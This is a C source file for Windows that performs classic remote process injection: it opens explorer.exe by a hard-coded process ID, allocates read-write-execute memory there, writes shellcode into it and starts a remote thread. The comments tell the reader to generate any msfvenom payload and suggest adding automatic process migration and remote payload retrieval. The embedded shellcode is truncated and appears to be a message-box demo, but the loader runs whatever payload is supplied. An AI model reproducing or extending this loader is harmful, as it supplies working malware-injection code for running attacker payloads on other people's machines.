#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
Instructions: 
Compile in Visual Studio in 64-bit
Generate Shellcode with msfvenom -p windows/x64/PAYLOAD/OF/CHOICE -f c++ -v payload
Update payload_len variable
Update ProcessID

Ideas on how to improve:
Auto calculate payload length
Automatically migrate into a new process based on process name
Retrieve payload from a remote server

*/

int main(void) {

    // Variable Declaration
    void* exec_mem;
    HANDLE remoteProcess; // A Handle to the remote process

    // Variable Assignment 
    unsigned int payload_len = 302; // Payload length - See MSFVenom for byte count
    int procId = 21968; // Explorer.exe Process id

    unsigned char payload[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        // Snip!
        "\x61\x72\x74\x79\x3f\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f"
        "\x78\x00";


    // WinAPI Calls
    remoteProcess = OpenProcess(PROCESS_ALL_ACCESS, false, procId); // Opens a handle to the "Explorer.exe" based on ProcID variable with "All Access" rights (0x001F0FF)

    // Allocate a memory buffer for payload
    exec_mem = VirtualAllocEx(remoteProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocates memory in a remote process with MEM_COMMIT and MEM_RESERVE rights, in a RWX memory region
    //VirtualAllocEx(Explorer.exe, Auto assign a memory address, allow commits to memory, allow reserve + RWX)

    WriteProcessMemory(remoteProcess, exec_mem, payload, payload_len, NULL); // Writes shellcode into remote process
    //WriteProcessMemory(Explorer.exe, Explorer.exe RWX Memory address, MsgBox Shellcode, Length of MsgBox Payload, Number of bytes written);

    CreateRemoteThread(remoteProcess, NULL, payload_len, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0); // Creates a new thread in the remote process
    //CreateRemoteThread(Explorer.exe, Default Thread Attributes, New stack size (Length of MsgBox Payload), Memory Address of shellcode start, No args passed to start function, Run thread immediately after creation, pointer to new thread ID);  

    return 0;
}
